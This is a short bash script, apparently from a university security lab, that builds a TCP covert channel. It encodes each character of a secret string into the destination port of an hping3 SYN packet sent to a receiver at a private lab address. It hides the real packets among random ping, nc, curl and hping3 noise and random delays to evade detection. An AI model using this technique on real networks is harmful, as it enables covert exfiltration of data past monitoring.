#!/bin/bash
SECRET="PTIT_SECURITY"
RECEIVER_IP="192.168.20.20"

echo "[TCP Covert] Starting transmission..."

generate_noise() {
    case $((RANDOM % 4)) in
        0) # ICMP ping
            ping -c 1 $RECEIVER_IP > /dev/null
            echo "Sent ICMP ping"
            ;;
        1) # UDP random port
            port=$((2000 + RANDOM % 30000))
            echo "Sent UDP to port $port"
            echo -n "$RANDOM" | nc -u -w 1 $RECEIVER_IP $port
            ;;
        2) # HTTP request
            echo "Sent HTTP GET"
            curl -s "http://$RECEIVER_IP/$RANDOM" > /dev/null
            ;;
        3) # TCP random port
            port=$((2000 + RANDOM % 5000))
            echo "Sent TCP SYN to port $port"
            hping3 -S -c 1 -p $port $RECEIVER_IP > /dev/null 2>&1
            ;;
    esac
}

for (( i=0; i<${#SECRET}; i++ )); do
    # sending real packet
    char=${SECRET:$i:1}
    port=$((8000 + $(printf "%d" "'$char")))
    echo "Sending..."
    hping3 -S -c 1 -p $port $RECEIVER_IP
    
    # Tạo nhiễu ngẫu nhiên
    for (( j=0; j<2; j++ )); do  # 2 noise packets per 1 real packet
        generate_noise
    done
    
    sleep $((RANDOM % 2 + 1))  # random delay seconds
done

echo "Transmission completed!"
